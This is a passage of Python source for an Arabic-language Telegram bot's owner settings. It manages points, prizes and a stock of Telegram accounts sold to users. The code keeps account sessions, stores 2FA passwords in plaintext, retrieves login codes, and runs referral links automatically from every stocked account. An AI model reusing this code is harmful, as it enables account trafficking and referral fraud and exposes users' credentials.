            f"_(محسوب: {rate}$ × 100000 = {suggested} نقطة/1000 وحدة)_\n\n"
            f"اضغط الزر لاستخدامه أو أرسل رقماً مختلفاً:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=kb
        )
        context.user_data["state"] = "os_await_price"
        return

    if is_own and state == "os_await_price":
        try:
            price = float(text)
        except ValueError:
            await update.message.reply_text("⚠️ أرسل رقماً.")
            return
        await _save_service(update, context, price)
        return

    if is_own and state == "os_await_gift_val":
        try:
            val = int(text)
        except ValueError:
            await update.message.reply_text("⚠️ أرسل رقماً.")
            return
        set_setting("daily_gift_points", str(val))
        await update.message.reply_text(f"✅ تم تحديث الهدية اليومية إلى {val} نقطة.", reply_markup=owner_settings_kb())
        context.user_data["state"] = "main_menu"
        return

    if is_own and state == "os_await_referral_val":
        try:
            val = int(text)
        except ValueError:
            await update.message.reply_text("⚠️ أرسل رقماً.")
            return
        set_setting("referral_points", str(val))
        await update.message.reply_text(f"✅ تم تحديث نقاط الدعوة إلى {val} نقطة.", reply_markup=owner_settings_kb())
        context.user_data["state"] = "main_menu"
        return

    if is_own and state == "os_await_contest_duration":
        td = _parse_contest_duration(text)
        if td is None:
            await update.message.reply_text(
                "⚠️ صيغة الوقت غير صحيحة.\n"
                "أرسل رقماً متبوعاً بحرف الوحدة:\n"
                "• `7s` ← 7 ثوانٍ\n"
                "• `30m` ← 30 دقيقة\n"
                "• `24h` ← 24 ساعة\n"
                "• `7d` ← 7 أيام",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        now_utc = datetime.now(timezone.utc)
        end_dt  = now_utc + td
        set_setting("referral_contest_type",  "limited")
        set_setting("referral_contest_start", now_utc.isoformat())
        set_setting("referral_contest_end",   end_dt.isoformat())
        context.user_data["state"] = "main_menu"
        remaining = _format_contest_time_remaining(end_dt)
        await update.message.reply_text(
            f"✅ *تم بدء مسابقة رابط الدعوة (محدودة)*\n\n"
            f"⏳ تنتهي بعد: *{remaining}*\n"
            f"📅 وقت الانتهاء: `{end_dt.strftime('%Y-%m-%d %H:%M')} UTC`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=owner_settings_kb()
        )
        return

    if is_own and state == "os_await_star_rate":
        try:
            val = int(text)
        except ValueError:
            await update.message.reply_text("⚠️ أرسل رقماً.")
            return
        set_setting("star_to_points", str(val))
        await update.message.reply_text(f"✅ سعر النجمة (شحن) = {val} نقطة.", reply_markup=owner_settings_kb())
        context.user_data["state"] = "main_menu"
        return

    if is_own and state == "os_await_exchange_rate":
        try:
            val = int(text)
        except ValueError:
            await update.message.reply_text("⚠️ أرسل رقماً.")
            return
        set_setting("exchange_star_rate", str(val))
        await update.message.reply_text(f"✅ سعر نجمة الجوائز = {val} نقطة.", reply_markup=owner_settings_kb())
        context.user_data["state"] = "main_menu"
        return

    if is_own and state == "os_await_exchange_msg":
        set_setting("exchange_success_msg", text.strip())
        await update.message.reply_text(
            "✅ تم حفظ الرسالة. ستظهر لكل مستخدم عند إتمام عملية استبدال، متبوعة بكود عمليته.",
            reply_markup=owner_settings_kb()
        )
        context.user_data["state"] = "main_menu"
        return

    if is_own and state == "os_await_join_reward":
        try:
            val = int(text)
        except ValueError:
            await update.message.reply_text("⚠️ أرسل رقماً صحيحاً.")
            return
        set_setting("join_channel_reward", str(val))
        await update.message.reply_text(f"✅ نقاط الانضمام للقنوات = {val} نقطة.", reply_markup=owner_settings_kb())
        context.user_data["state"] = "main_menu"
        return

    if is_own and state == "os_await_leave_penalty":
        try:
            val = int(text)
        except ValueError:
            await update.message.reply_text("⚠️ أرسل رقماً صحيحاً.")
            return
        set_setting("channel_leave_penalty", str(val))
        await update.message.reply_text(f"✅ خصم مغادرة القناة = {val} نقطة.", reply_markup=owner_settings_kb())
        context.user_data["state"] = "main_menu"
        return

    # ─── إعدادات مهلة المغادرة الآمنة ───
    if is_own and state == "os_await_leave_grace":
        try:
            val = int(text.strip())
            if val < 0:
                raise ValueError
        except ValueError:
            await update.message.reply_text("⚠️ أرسل رقماً صحيحاً (ساعات).")
            return
        set_setting("internal_leave_grace_hours", str(val))
        await update.message.reply_text(f"✅ مهلة المغادرة الآمنة = {val} ساعة.", reply_markup=owner_settings_kb())
        context.user_data["state"] = "main_menu"
        return

    # ─── إعدادات نجوم الاشتراك الإجباري ───
    if is_own and state == "os_await_mstars_min":
        try:
            val = int(text.strip())
            if val < 0:
                raise ValueError
        except ValueError:
            await update.message.reply_text("⚠️ أرسل رقماً صحيحاً.")
            return
        set_setting("mandatory_stars_min_members", str(val))
        await update.message.reply_text(f"✅ الحد الأدنى للاشتراك الإجباري بالنجوم = {val:,} عضو.", reply_markup=owner_settings_kb())
        context.user_data["state"] = "main_menu"
        return

    if is_own and state == "os_await_mstars_t1max":
        try:
            val = int(text.strip())
            if val <= 0:
                raise ValueError
        except ValueError:
            await update.message.reply_text("⚠️ أرسل رقماً صحيحاً.")
            return
        set_setting("mandatory_stars_tier1_max", str(val))
        await update.message.reply_text(f"✅ الحد الأعلى للشريحة 1 = {val:,} عضو.", reply_markup=owner_settings_kb())
        context.user_data["state"] = "main_menu"
        return

    if is_own and state == "os_await_mstars_t1p":
        try:
            val = int(text.strip())
            if val <= 0:
                raise ValueError
        except ValueError:
            await update.message.reply_text("⚠️ أرسل رقماً صحيحاً (× 100). مثال: 50 = 0.50 نجمة.")
            return
        set_setting("mandatory_stars_tier1_price_x100", str(val))
        await update.message.reply_text(f"✅ سعر الشريحة 1 = {val/100:.2f} نجمة/عضو.", reply_markup=owner_settings_kb())
        context.user_data["state"] = "main_menu"
        return

    if is_own and state == "os_await_mstars_t2p":
        try:
            val = int(text.strip())
            if val <= 0:
                raise ValueError
        except ValueError:
            await update.message.reply_text("⚠️ أرسل رقماً صحيحاً (× 100). مثال: 33 = 0.33 نجمة.")
            return
        set_setting("mandatory_stars_tier2_price_x100", str(val))
        await update.message.reply_text(f"✅ سعر الشريحة 2 = {val/100:.2f} نجمة/عضو.", reply_markup=owner_settings_kb())
        context.user_data["state"] = "main_menu"
        return

    if is_own and state == "os_await_mpoints_price":
        try:
            val = int(text.strip())
            if val <= 0: raise ValueError
        except ValueError:
            await update.message.reply_text("⚠️ أرسل رقماً صحيحاً.")
            return
        set_setting("mandatory_points_price", str(val))
        await update.message.reply_text(f"✅ سعر الإجباري بالنقاط = {val} نقطة/عضو.", reply_markup=owner_settings_kb())
        context.user_data["state"] = "main_menu"
        return

    if is_own and state == "os_await_mpoints_min":
        try:
            val = int(text.strip())
            if val < 0: raise ValueError
        except ValueError:
            await update.message.reply_text("⚠️ أرسل رقماً صحيحاً.")
            return
        set_setting("mandatory_points_min", str(val))
        await update.message.reply_text(f"✅ الحد الأدنى (إجباري-نقاط) = {val:,} عضو.", reply_markup=owner_settings_kb())
        context.user_data["state"] = "main_menu"
        return

    if is_own and state == "os_await_ref_extra_pts":
        try:
            extra = int(text.strip())
            if extra <= 0: raise ValueError
        except ValueError:
            await update.message.reply_text("⚠️ أرسل رقماً صحيحاً أكبر من 0.")
            return
        inv_id   = context.user_data.get("ref_extra_id")
        base_pts = context.user_data.get("ref_extra_base", 0)
        total_deduct = base_pts + extra
        with db_conn() as _c:
            _c.execute("UPDATE users SET points=GREATEST(0, points-%s), referral_points_blocked=0 WHERE user_id=%s", (total_deduct, inv_id))
        await update.message.reply_text(
            f"✅ *تم خصم {total_deduct} نقطة ({base_pts} إحالة + {extra} إضافية) + رفع التقييد عن* `{inv_id}`",
            parse_mode=ParseMode.MARKDOWN, reply_markup=owner_settings_kb())
        context.user_data["state"] = "main_menu"
        return

    if is_own and state == "os_await_ref_user_id":
        _search_id = text.strip().lstrip("@")
        with db_conn() as _c:
            # بحث بـ user_id أو username
            _inv = None
            if _search_id.isdigit():
                _inv = _c.execute("SELECT user_id, full_name, username FROM users WHERE user_id=%s", (int(_search_id),)).fetchone()
            if not _inv:
                _inv = _c.execute("SELECT user_id, full_name, username FROM users WHERE username=%s", (_search_id,)).fetchone()
            if not _inv:
                await update.message.reply_text(f"❌ لا يوجد مستخدم بـ «{_search_id}».", reply_markup=owner_settings_kb())
                context.user_data["state"] = "main_menu"
                return
            _inv = dict(_inv)
            _refs = _c.execute(
                "SELECT user_id, full_name, username, credited_at FROM users "
                "WHERE invited_by=%s AND referral_credited=1 ORDER BY credited_at DESC LIMIT 30",
                (_inv["user_id"],)
            ).fetchall()
        _inv_name = _inv.get("full_name") or f"ID:{_inv['user_id']}"
        _inv_un   = f" (@{_inv['username']})" if _inv.get("username") else ""
        if not _refs:
            _lines = [f"👤 *{_inv_name}{_inv_un}*\n📊 لا توجد إحالات مكتملة حتى الآن."]
        else:
            _lines = [f"👤 *{_inv_name}{_inv_un}* — {len(_refs)} إحالة:\n"]
            for _r in _refs:
                _r = dict(_r)
                _rn = _r.get("full_name") or f"ID:{_r['user_id']}"
                _run = f" (@{_r['username']})" if _r.get("username") else ""
                _raw_dt = _r.get("credited_at")
                if _raw_dt:
                    import datetime as _dt
                    if hasattr(_raw_dt, "strftime"):
                        # كائن datetime — نعرض حتى أجزاء الثانية (microseconds)
                        _us = _raw_dt.microsecond
                        _dat = _raw_dt.strftime("%Y-%m-%d %H:%M:%S") + (f".{_us:06d}"[:8] if _us else "")
                    else:
                        _s = str(_raw_dt)
                        _dat = _s[:26]  # نحتفظ بأجزاء الثانية إن وُجدت
                else:
                    _dat = "—"
                _lines.append(f"• {_rn}{_run} — `{_dat}`")
        await update.message.reply_text(
            "\n".join(_lines), parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="os:top_referrers")]]))
        context.user_data["state"] = "main_menu"
        return



    # ─── تحقق بكود الطلب من الحسابات المبيوعة ───
    if is_own and state == "os_await_sold_code_search":
        search_code = text.strip().upper()
        with db_conn() as c:
            pe = c.execute(
                "SELECT pe.*, u.full_name AS buyer_name, u.user_id AS buyer_id "
                "FROM prize_exchanges pe "
                "LEFT JOIN users u ON u.user_id = pe.user_id "
                "WHERE UPPER(pe.order_code) = %s "
                "  AND pe.prize_type IN ('telegram_number','telegram_number_code')",
                (search_code,)
            ).fetchone()
            ns = None
            if pe:
                ns = c.execute(
                    "SELECT phone_number, ever_sold, assigned_to, deleted_at, session_string, "
                    "       frozen_at, last_authorized, added_at "
                    "FROM number_stock WHERE phone_number = %s",
                    (pe["prize_value"],)
                ).fetchone()
        if not pe:
            await update.message.reply_text(
                f"❌ لا يوجد طلب بيع بالكود: `{search_code}`",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع للمبيوعات", callback_data="os:sold_accounts")]])
            )
            context.user_data["state"] = "main_menu"
            return

        def _fmt_dt(v):
            if v is None: return "—"
            if hasattr(v, "strftime"): return v.strftime("%Y-%m-%d %H:%M")
            return str(v)[:16]

        # حالة الحساب الحالية
        if ns:
            if ns["deleted_at"]:
                acc_status = "🗑 محذوف"
            elif ns["assigned_to"]:
                acc_status = f"🟢 نشط — لدى المشتري حالياً (`{ns['assigned_to']}`)"
            elif ns["ever_sold"]:
                acc_status = "⬜ بيع سابق — البوت غادر الحساب"
            elif ns["frozen_at"]:
                acc_status = "🧊 مجمّد"
            elif not ns["last_authorized"]:
                acc_status = "🔴 مطرود (kicked)"
            else:
                acc_status = "✅ في المخزون"
            has_session = "✅ نعم" if ns["session_string"] else "❌ لا"
        else:
            acc_status = "⚠️ الرقم غير موجود في المخزون"
            has_session = "—"

        status_ar = {
            "completed": "✅ مكتمل",
            "pending": "⏳ معلق",
            "cancelled": "❌ ملغى",
            "duplicate_compensated": "⚠️ مكرر (عُوِّض)",
        }.get(pe["status"], pe["status"])

        msg = (
            f"🧾 *نتيجة التحقق — كود:* `{search_code}`\n\n"
            f"📱 *الرقم:* `{pe['prize_value']}`\n"
            f"👤 *المشتري:* {pe['buyer_name'] or '—'} (`{pe['buyer_id']}`)\n"
            f"💰 *التكلفة:* {pe['points_cost']:,} نقطة\n"
            f"📅 *تاريخ الشراء:* {_fmt_dt(pe['created_at'])}\n"
            f"📌 *حالة الطلب:* {status_ar}\n\n"
            f"🔑 *حالة الحساب الآن:* {acc_status}\n"
            f"💾 *جلسة موجودة:* {has_session}"
        )
        await update.message.reply_text(
            msg,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع للمبيوعات", callback_data="os:sold_accounts")]])
        )
        context.user_data["state"] = "main_menu"
        return

    # ─── بحث شامل برقم هاتف (مباع أو غير مباع) ───
    if is_own and state == "os_await_phone_search":
        q_phone = text.strip()
        like_q  = "%" + q_phone.lstrip("+") + "%"
        with db_conn() as _sc:
            rows = _sc.execute(
                "SELECT ns.id, ns.phone_number, ns.session_string, ns.assigned_to, ns.assigned_at, "
                "       ns.ever_sold, ns.twofa_password, ns.last_authorized, ns.deleted_at, "
                "       ns.frozen_at, ns.sessions_reset, "
                "       pe.order_code, pe.created_at AS sale_date, pe.points_cost, "
                "       u.full_name AS buyer_name "
                "FROM number_stock ns "
                "LEFT JOIN prize_exchanges pe ON pe.prize_value = ns.phone_number "
                "     AND pe.status = 'completed' "
                "     AND pe.prize_type IN ('telegram_number','telegram_number_code') "
                "LEFT JOIN users u ON u.user_id = ns.assigned_to "
                "WHERE ns.phone_number LIKE %s "
                "ORDER BY ns.id DESC LIMIT 5",
                (like_q,)
            ).fetchall()
        if not rows:
            await update.message.reply_text(
                f"❌ لا يوجد رقم يطابق «{q_phone}» في قاعدة البيانات.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع للمخزون", callback_data="os:manage_numbers")]]))
            context.user_data["state"] = "main_menu"
            return
        def _fd2(v):
            if v is None: return "—"
            if hasattr(v, "strftime"): return v.strftime("%Y-%m-%d %H:%M")
            return str(v)[:16]
        for r in rows:
            r = dict(r)
            has_session = bool(r.get("session_string"))
            is_sold_now = bool(r.get("assigned_to"))
            ever_sold   = bool(r.get("ever_sold"))
            is_deleted  = bool(r.get("deleted_at"))
            is_frozen   = bool(r.get("frozen_at"))
            is_kicked   = r.get("last_authorized") is False
            buyer_name  = r.get("buyer_name") or (f"ID:{r['assigned_to']}" if r.get("assigned_to") else "—")
            saved_2fa   = r.get("twofa_password") or "—"
            if is_deleted:
                status_icon = "🗑 محذوف (سلة المهملات)"
            elif is_sold_now:
                status_icon = "🟢 مباع الآن (نشط)"
            elif ever_sold:
                status_icon = "⬜ مباع سابقاً (البوت غادره)"
            elif is_frozen:
                status_icon = "🧊 مجمّد"
            elif is_kicked:
                status_icon = "🚫 مطرود (جلسة منتهية)"
            elif has_session:
                status_icon = "✅ متاح للبيع"
            else:
                status_icon = "⚠️ يدوي (بدون جلسة)"
            stock_id = r["id"]
            info = (
                f"📱 *{r['phone_number']}*\n"
                f"📌 الحالة: {status_icon}\n"
                f"🌍 الدولة: {guess_country(r['phone_number'])}\n"
                f"📡 جلسة البوت: {'✅' if has_session else '❌'}\n"
                f"🗝 كلمة 2FA: `{saved_2fa}`\n"
                f"👤 المشتري: {buyer_name}\n"
                f"📅 تاريخ البيع: {_fd2(r.get('assigned_at') or r.get('sale_date'))}\n"
                f"📌 كود الطلب: {r.get('order_code') or '—'}\n"
                f"🔒 طُردت الجلسات: {'✅' if r.get('sessions_reset') else '❌'}"
            )
            action_btns = []
            if has_session:
                action_btns += [
                    [InlineKeyboardButton("🔑 جلب آخر كود وصل",         callback_data=f"os:sold_code:{stock_id}")],
                    [InlineKeyboardButton("🚫 طرد جميع الجلسات الأخرى",  callback_data=f"os:sold_kick:{stock_id}")],
                    [InlineKeyboardButton("🔐 تغيير/عرض 2FA",            callback_data=f"os:sold_2fa:{stock_id}")],
                    [InlineKeyboardButton("🚪 تسجيل خروج البوت",          callback_data=f"os:sold_logout:{stock_id}")],
                ]
            action_btns.append([InlineKeyboardButton("🔙 رجوع للمخزون", callback_data="os:manage_numbers")])
            await update.message.reply_text(
                info, parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup(action_btns))
        context.user_data["state"] = "main_menu"
        return

    # ─── بحث في الحسابات المبيوعة ───
    if is_own and state == "os_await_sold_search":
        query_phone = text.strip().lstrip("+")
        with db_conn() as c:
            rows = c.execute(
                "SELECT ns.phone_number, ns.ever_sold, "
                "       pe.created_at AS sale_date, pe.order_code, u.full_name AS buyer_name, pe.user_id AS buyer_id "
                "FROM number_stock ns "
                "LEFT JOIN prize_exchanges pe ON pe.prize_value = ns.phone_number "
                "     AND pe.status = 'completed' "
                "     AND pe.prize_type IN ('telegram_number','telegram_number_code') "
                "LEFT JOIN users u ON u.user_id = pe.user_id "
                "WHERE ns.phone_number LIKE %s AND ns.ever_sold IS TRUE",
                (f"%{query_phone}%",)
            ).fetchall()
        if not rows:
            await update.message.reply_text("🔍 لا توجد نتائج مطابقة.", reply_markup=owner_settings_kb())
            context.user_data["state"] = "main_menu"
            return
        def _fmt_dt(v):
            if v is None: return "—"
            if hasattr(v, "strftime"): return v.strftime("%Y-%m-%d %H:%M")
            return str(v)[:16]
        lines = [f"🔍 *نتائج البحث عن «{query_phone}»:*\n"]
        for r in rows:
            buyer_name = r["buyer_name"] or f"ID:{r.get('buyer_id','?')}"
            lines.append(
                f"📱 `{r['phone_number']}`\n"
                f"   👤 المشتري: {buyer_name}\n"
                f"   📅 تاريخ البيع: {_fmt_dt(r['sale_date'])}\n"
                f"   📌 كود: {r['order_code'] or '—'}"
            )
        await update.message.reply_text(
            "\n".join(lines),
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع للمبيوعات", callback_data="os:sold_accounts")]])
        )
        context.user_data["state"] = "main_menu"
        return

    if is_own and state == "os_await_mandatory_cost":
        try:
            val = int(text)
        except ValueError:
            await update.message.reply_text("⚠️ أرسل رقماً صحيحاً.")
            return
        set_setting("mandatory_channel_cost", str(val))
        await update.message.reply_text(f"✅ سعر تمويل القناة الإجباري = {val} نقطة.", reply_markup=owner_settings_kb())
        context.user_data["state"] = "main_menu"
        return

    if is_own and state == "os_await_internal_cost":
        try:
            val = int(text)
        except ValueError:
            await update.message.reply_text("⚠️ أرسل رقماً صحيحاً.")
            return
        set_setting("internal_channel_cost", str(val))
        await update.message.reply_text(f"✅ سعر تمويل القناة الداخلي = {val} نقطة.", reply_markup=owner_settings_kb())
        context.user_data["state"] = "main_menu"
        return

    if is_own and state == "os_await_number_cost":
        try:
            val = int(text)
        except ValueError:
            await update.message.reply_text("⚠️ أرسل رقماً.")
            return
        set_setting("telegram_number_cost", str(val))
        await update.message.reply_text(f"✅ سعر رقم تيلغرام = {val} نقطة.", reply_markup=owner_settings_kb())
        context.user_data["state"] = "main_menu"
        return

    if is_own and state == "os_await_login_phone":
        phone = text.strip()
        # ─── إضافة + تلقائياً إذا أرسل المالك الرقم بدونها ───
        if phone and not phone.startswith("+") and phone.isdigit():
            phone = "+" + phone
        if not phone.startswith("+") or not phone[1:].replace(" ", "").isdigit():
            await update.message.reply_text("⚠️ أرسل الرقم بصيغة دولية (مثال: `+9647701234567` أو `9647701234567`).", parse_mode=ParseMode.MARKDOWN)
            return
        try:
            client = TelegramClient(StringSession(), int(TELEGRAM_API_ID), TELEGRAM_API_HASH)
            await client.connect()
            sent = await client.send_code_request(phone)
        except FloodWaitError as e:
            await update.message.reply_text(f"⚠️ عدد محاولات كبير على هذا الرقم، انتظر {e.seconds} ثانية وحاول مجدداً.")
            return
        except PhoneNumberInvalidError:
            await update.message.reply_text("⚠️ الرقم غير صحيح. تأكد من الصيغة وأعد الإرسال.")
            return
        except Exception as e:
            logger.error(f"❌ خطأ في إرسال كود الدخول: {e}")
            await update.message.reply_text("❌ حدث خطأ أثناء الاتصال بتيليجرام. حاول مرة أخرى لاحقاً.")
            return
        _pending_number_logins[user.id] = {
            "client": client, "phone": phone, "phone_code_hash": sent.phone_code_hash
        }
        context.user_data["state"] = "os_await_login_code"
        await update.message.reply_text(
            "📩 تم إرسال كود التفعيل إلى الرقم. أرسل الكود الذي وصلك (أرقام فقط):"
        )
        return

    if is_own and state == "os_await_login_code":
        pending = _pending_number_logins.get(user.id)
        if not pending:
            await update.message.reply_text("⚠️ انتهت الجلسة، ابدأ من جديد من قائمة إدارة الأرقام.", reply_markup=owner_settings_kb())
            context.user_data["state"] = "main_menu"
            return
        client = pending["client"]
        code = text.strip().replace(" ", "")
        try:
            await client.sign_in(pending["phone"], code, phone_code_hash=pending["phone_code_hash"])
        except SessionPasswordNeededError:
            context.user_data["state"] = "os_await_login_password"
            await update.message.reply_text("🔒 هذا الحساب محمي بكلمة مرور تحقق بخطوتين (2FA). أرسلها الآن:")
            return
        except (PhoneCodeInvalidError, PhoneCodeExpiredError):
            await update.message.reply_text("⚠️ الكود غير صحيح أو منتهي الصلاحية. أرسل الكود الصحيح مجدداً.")
            return
        except Exception as e:
            logger.error(f"❌ خطأ في تسجيل الدخول: {e}")
            await update.message.reply_text("❌ فشل تسجيل الدخول. حاول من جديد لاحقاً من قائمة إدارة الأرقام.", reply_markup=owner_settings_kb())
            await _cleanup_pending_login(user.id)
            context.user_data["state"] = "main_menu"
            return
        await _finish_number_login(update, context, user.id)
        return

    if is_own and state == "os_await_login_password":
        pending = _pending_number_logins.get(user.id)
        if not pending:
            await update.message.reply_text("⚠️ انتهت الجلسة، ابدأ من جديد من قائمة إدارة الأرقام.", reply_markup=owner_settings_kb())
            context.user_data["state"] = "main_menu"
            return
        client = pending["client"]
        try:
            await client.sign_in(password=text.strip())
        except PasswordHashInvalidError:
            await update.message.reply_text("⚠️ كلمة المرور غير صحيحة. أرسلها مجدداً:")
            return
        except Exception as e:
            logger.error(f"❌ خطأ في تسجيل الدخول (2FA): {e}")
            await update.message.reply_text("❌ فشل تسجيل الدخول. حاول من جديد لاحقاً من قائمة إدارة الأرقام.", reply_markup=owner_settings_kb())
            await _cleanup_pending_login(user.id)
            context.user_data["state"] = "main_menu"
            return
        await _finish_number_login(update, context, user.id)
        return

    if is_own and state == "os_await_manual_2fa_pwd":
        stock_id = context.user_data.get("manual_2fa_stock_id")
        pwd = text.strip()
        context.user_data["state"] = "main_menu"
        context.user_data.pop("manual_2fa_stock_id", None)
        if not stock_id:
            await update.message.reply_text("⚠️ انتهت صلاحية الطلب، افتح معلومات الرقم من جديد.")
            return
        with db_conn() as c:
            rec = c.execute(
                "SELECT phone_number, session_string FROM number_stock WHERE id=%s", (stock_id,)
            ).fetchone()
        if not rec or not rec["session_string"]:
            await update.message.reply_text("⚠️ لم يُعثر على هذا الرقم بعد الآن.")
            return
        await update.message.reply_text("⏳ جاري التحقق من كلمة المرور مع تيليجرام...")
        client = TelegramClient(StringSession(rec["session_string"]), int(TELEGRAM_API_ID), TELEGRAM_API_HASH)
        try:
            await client.connect()
            verified = await verify_current_2fa_password(client, pwd, phone=rec["phone_number"])
        finally:
            try:
                await client.disconnect()
            except Exception:
                pass
        if verified is True:
            with db_conn() as c:
                c.execute("UPDATE number_stock SET twofa_password=%s WHERE id=%s", (pwd, stock_id))
            await update.message.reply_text(
                f"✅ تم التحقق من كلمة المرور وحفظها بنجاح لرقم `{rec['phone_number']}`.",
                parse_mode=ParseMode.MARKDOWN
            )
        elif verified is False:
            context.user_data["state"] = "os_await_manual_2fa_pwd"
            context.user_data["manual_2fa_stock_id"] = stock_id
            await update.message.reply_text(
                f"❌ كلمة المرور خاطئة لرقم `{rec['phone_number']}`. أرسل الكلمة الصحيحة مجدداً:",
                parse_mode=ParseMode.MARKDOWN
            )
        else:
            await update.message.reply_text("⚠️ تعذّر التحقق الآن (خطأ شبكي)، حاول مجدداً بعد قليل.")
        return

    if is_own and state == "os_await_ref_task_link":
        # يقبل:  t.me/BotUser?start=CODE  أو  BotUser CODE
        raw = text.strip()
        bot_user = ""
        start_p  = ""
        try:
            if "t.me/" in raw or "telegram.me/" in raw:
                # مثال: https://t.me/MyBot?start=refABC
                from urllib.parse import urlparse, parse_qs
                parsed = urlparse(raw if raw.startswith("http") else "https://" + raw)
                bot_user = parsed.path.strip("/")
                qs = parse_qs(parsed.query)
                start_p = qs.get("start", [""])[0]
            else:
                # مثال: MyBot refABC
                parts = raw.split(None, 1)
                bot_user = parts[0].lstrip("@")
                start_p  = parts[1] if len(parts) > 1 else ""

            if not bot_user or not start_p:
                raise ValueError("يوزر أو كود فارغ")

            label = f"@{bot_user} — {start_p[:20]}"
            task_id = add_referral_task(label, bot_user, start_p)
            context.user_data["state"] = "main_menu"
            await update.message.reply_text(
                f"✅ *تمت إضافة مهمة الإحالة بنجاح!*\n\n"
                f"📌 البوت: @{bot_user}\n"
                f"🔑 الكود: `{start_p}`\n\n"
                f"ستُنفَّذ تلقائياً على كل الأرقام كل ساعة.\n"
                f"يمكنك أيضاً تشغيلها فوراً من ⚙️ تفاصيل المهمة.",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=owner_settings_kb()
            )
        except Exception as parse_err:
            await update.message.reply_text(
                f"⚠️ تعذّر قراءة الرابط: `{parse_err}`\n\n"
                "أرسله بهذا الشكل:\n`t.me/BotUsername?start=REFERRAL_CODE`\n"
                "أو: `BotUsername REFERRAL_CODE`",
                parse_mode=ParseMode.MARKDOWN
            )
        return

    if is_own and state == "os_await_add_numbers":
        raw_numbers = [n for chunk in text.split(",") for n in chunk.splitlines()]
        added = add_numbers_to_stock(raw_numbers)
        avail = get_available_number_count()
        await update.message.reply_text(
            f"✅ تمت إضافة {added} رقم جديد للمخزون.\n📦 إجمالي المتاح الآن: {avail} رقم.",
            reply_markup=owner_settings_kb()
        )
        context.user_data["state"] = "main_menu"
        return

    if is_own and state == "os_await_welcome":
        set_setting("welcome_message", text)
        await update.message.reply_text("✅ تم تحديث رسالة الترحيب.", reply_markup=owner_settings_kb())
        context.user_data["state"] = "main_menu"
        return

    if is_own and state == "os_await_contact":
        if text.strip().lower() == "حذف":
            set_setting("owner_contact", "")
            await update.message.reply_text("✅ تم حذف رابط تواصل المالك.", reply_markup=owner_settings_kb())
        elif text.strip().startswith("https://t.me/") or text.strip().startswith("https://"):
            set_setting("owner_contact", text.strip())
            await update.message.reply_text(f"✅ تم حفظ رابط التواصل:\n{text.strip()}", reply_markup=owner_settings_kb())
        else:
            await update.message.reply_text(
                "⚠️ الرابط غير صحيح. يجب أن يبدأ بـ `https://t.me/` مثال:\n`https://t.me/username`\n\nأو أرسل *حذف* لإزالة الرابط.",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        context.user_data["state"] = "main_menu"
        return

    if is_own and state == "os_await_contact_label":
        new_label = text.strip()
        if not new_label:
            await update.message.reply_text("⚠️ النص لا يمكن أن يكون فارغاً.")
            return
        set_setting("owner_contact_label", new_label)
        await update.message.reply_text(
            f"✅ تم تحديث نص زر التواصل (بعد الخصم) إلى:\n{new_label}",
            reply_markup=owner_settings_kb()
        )
        context.user_data["state"] = "main_menu"
        return

    if is_own and state == "os_await_support_label":
        new_label = text.strip()
        if not new_label:
            await update.message.reply_text("⚠️ النص لا يمكن أن يكون فارغاً.")
            return
        set_setting("support_contact_label", new_label)
        await update.message.reply_text(
            f"✅ تم تحديث نص زر الدعم إلى:\n{new_label}",
            reply_markup=owner_settings_kb()
        )
        context.user_data["state"] = "main_menu"
        return

    # ── إضافة جائزة مخصصة: الاسم ──
    if is_own and state == "os_await_prize_name":
        name = text.strip()
        if not name:
            await update.message.reply_text("⚠️ الاسم لا يمكن أن يكون فارغاً، أعد الإرسال.")
            return
        context.user_data["prize_name"] = name
        context.user_data["state"] = "os_await_prize_qty"
        await update.message.reply_text(
            f"🎀 *الجائزة:* {name}\n\n"
            f"الخطوة 1.5/2 — أرسل *العدد* لكل طلب (مثال: `1`) أو اضغط تخطي:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("⏭ تخطي (العدد = 1)", callback_data="os:skip_prize_qty")]
            ])
        )
        return

    # ── إضافة جائزة مخصصة: العدد ──
    if is_own and state == "os_await_prize_qty":
        try:
            qty = int(text.strip().replace(",", ""))
            if qty <= 0: raise ValueError
        except ValueError:
            await update.message.reply_text("⚠️ أرسل رقماً صحيحاً موجباً أو اضغط تخطي.")
            return
        context.user_data["prize_qty"] = qty
        context.user_data["state"] = "os_await_prize_cost"
        await update.message.reply_text(
            f"🎀 *الجائزة:* {context.user_data['prize_name']} × {qty}\n\n"
            f"الخطوة 2/2 — أرسل *عدد النقاط* اللازمة للحصول عليها:\n"
            f"مثال: `1000`",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    # ── إضافة جائزة مخصصة: التكلفة ──
    if is_own and state == "os_await_prize_cost":
        try:
            cost = int(text.strip().replace(",", ""))
            if cost <= 0: raise ValueError
        except ValueError:
            await update.message.reply_text("⚠️ أرسل رقماً صحيحاً موجباً.")
            return
        name = context.user_data.get("prize_name", "")
        qty  = context.user_data.get("prize_qty", 1)
        qty_txt = f" × {qty}" if qty > 1 else ""
        with db_conn() as c:
            c.execute(
                "INSERT INTO custom_prizes (name, quantity, points_cost, active) VALUES (%s, %s, %s, 1)",
                (name, qty, cost)
            )
        context.user_data.pop("prize_name", None)
        context.user_data.pop("prize_qty", None)
        context.user_data["state"] = "main_menu"
        await update.message.reply_text(
            f"✅ *تمت إضافة الجائزة بنجاح!*\n\n"
            f"🎀 الاسم: {name}{qty_txt}\n"
            f"💰 التكلفة: {cost:,} نقطة",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=owner_settings_kb()
        )
        return

    if is_own and state == "os_await_asiacell_text":
        set_setting("asiacell_text", text)
        await update.message.reply_text("✅ تم تحديث نص اسيا سيل.", reply_markup=owner_settings_kb())
